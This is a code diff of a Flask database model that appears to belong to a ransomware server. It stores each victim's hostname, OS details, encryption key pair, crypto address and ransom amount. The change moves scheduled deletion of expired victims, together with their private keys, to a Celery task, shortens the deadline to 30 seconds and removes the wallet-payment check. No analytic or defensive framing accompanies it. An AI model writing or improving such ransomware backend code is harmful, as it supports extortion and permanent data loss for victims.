@@ -1,13 +1,20 @@
 import pytz
-from app import db, app
-from datetime import datetime, timedelta
-from apscheduler.schedulers.background import BackgroundScheduler
-from utilities.wallet_api import wallet_api
+from app import db, app, celery
+from datetime import datetime, timedelta, timezone
 from werkzeug.security import generate_password_hash, check_password_hash
 from flask_login import UserMixin
 
 
 tz = pytz.timezone('America/Toronto')
+
+
+@celery.task(bind=True)
+def terminate_user(self, user_id):
+    with app.app_context():
+        user = Users.query.get(user_id)
+        if user:
+            db.session.delete(user)
+            db.session.commit()
 
 
 class Users(db.Model):
@@ -55,53 +62,12 @@ class Users(db.Model):
 
     def calculate_threshold_time(self):
         self.creation_date = datetime.now(tz=tz)
-        self.expiration = datetime.now(tz=tz) + timedelta(minutes=120)
+        self.expiration = datetime.now(tz=tz) + timedelta(seconds=30)
 
     def schedule_termination(self):
-        scheduler = BackgroundScheduler()
-        scheduler.add_job(self.terminate, 'date', run_date=self.expiration)
-        scheduler.add_job(self.monitor_payments, 'interval', seconds=30)
-        scheduler.start()
-
-
-    def terminate(self):
-        with app.app_context():
-            db.session.delete(self)
-            db.session.commit()
-
-    def monitor_payments(self):
-        with app.app_context():
-            users = Users.query.all()  # fetch all users
-            for user in users:
-                try:
-                    balance = wallet_api(user.crypto_address)
-                    if balance > 0:
-                        user.amount_paid = balance
-                        if user.amount_paid >= user.total_payment and not user.status:
-                            user.status = True
-                            paid_user = UsersPaid(
-                                username=user.username,
-                                hostname=user.hostname,
-                                uid=user.uid,
-                                os_name=user.os_name,
-                                os_version=user.os_version,
-                                os_architecture=user.os_architecture,
-                                email=user.email,
-                                public_key=user.public_key,
-                                private_key=user.private_key,
-                                crypto_address=user.crypto_address,
-                                total_payment=user.total_payment,
-                                status=True,
-                                amount_paid=user.amount_paid,
-                                creation_date=user.creation_date,
-                                payment_date=datetime.now(tz=tz)
-                            )
-                            db.session.add(paid_user)
-                            db.session.delete(user)
-
-                except Exception as e:
-                    print(e)
-            db.session.commit()
+        print(f"Scheduling termination for user_id: {self.id}")
+        delay = (self.expiration - datetime.now(timezone.utc)).total_seconds()
+        terminate_user.apply_async(args=[self.id], countdown=delay)
 
 
 class UsersPaid(db.Model):
